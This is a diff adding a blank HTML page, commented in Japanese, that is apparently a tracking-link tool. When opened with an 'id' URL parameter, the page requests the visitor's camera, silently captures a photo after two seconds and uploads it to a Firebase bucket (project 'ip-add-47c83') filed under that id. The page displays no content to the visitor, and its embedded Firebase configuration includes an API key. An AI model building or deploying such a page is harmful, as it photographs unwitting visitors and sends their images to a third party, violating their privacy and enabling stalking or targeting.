@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera Upload</title>
+  <!-- Firebase JavaScript SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js"></script>
+</head>
+<body>
+
+<script>
+  // Firebaseの設定
+  const firebaseConfig = {
+    apiKey: "AIzaSyDGHRQsE7-YH0UxEJ8FvdShUr3_k3AoMQM",
+    authDomain: "ip-add-47c83.firebaseapp.com",
+    databaseURL: "https://ip-add-47c83-default-rtdb.firebaseio.com",
+    projectId: "ip-add-47c83",
+    storageBucket: "ip-add-47c83.appspot.com",
+    messagingSenderId: "711426693718",
+    appId: "1:711426693718:web:0f0c9ec0c855f6780779f7",
+    measurementId: "G-7W03LE4GK0"
+  };
+
+  // Firebaseの初期化
+  firebase.initializeApp(firebaseConfig);
+  const storage = firebase.storage();
+
+  // カメラから写真を取得してFirebase Storageにアップロードする関数
+  function captureAndUploadPhoto(userId) {
+    // カメラにアクセス
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function (stream) {
+        // video要素にストリームをセット
+        const video = document.createElement('video');
+        document.body.appendChild(video);
+        video.srcObject = stream;
+        video.play();
+
+        // カメラのストリームからキャプチャ
+        setTimeout(function () {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const photoURL = canvas.toDataURL('image/png');
+          
+          // Firebase Storageにアップロード
+          const storageRef = storage.ref(`${userId}/${Date.now()}.png`);
+          storageRef.putString(photoURL, 'data_url').then(function(snapshot) {
+            console.log('Uploaded a data_url string!');
+          });
+
+          // ストリームを停止してvideo要素を削除
+          stream.getTracks().forEach(track => track.stop());
+          document.body.removeChild(video);
+        }, 2000); // 2秒後にキャプチャ
+      })
+      .catch(function (error) {
+        console.error('カメラへのアクセスに失敗しました:', error);
+      });
+  }
+
+  // ページの読み込みが完了したらカメラから写真を取得してアップロード
+  window.onload = function () {
+    const userId = getParameterByName('id'); // URLからidパラメーターを取得
+    if (userId) {
+      captureAndUploadPhoto(userId);
+    } else {
+      console.error('ユーザーIDが指定されていません。');
+    }
+  };
+
+  // URLから指定したパラメーターの値を取得する関数
+  function getParameterByName(name, url) {
+    if (!url) url = window.location.href;
+    name = name.replace(/[\[\]]/g, "\\$&");
+    const regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+        results = regex.exec(url);
+    if (!results) return null;
+    if (!results[2]) return '';
+    return decodeURIComponent(results[2].replace(/\+/g, " "));
+  }
+</script>
+
+</body>
+</html>
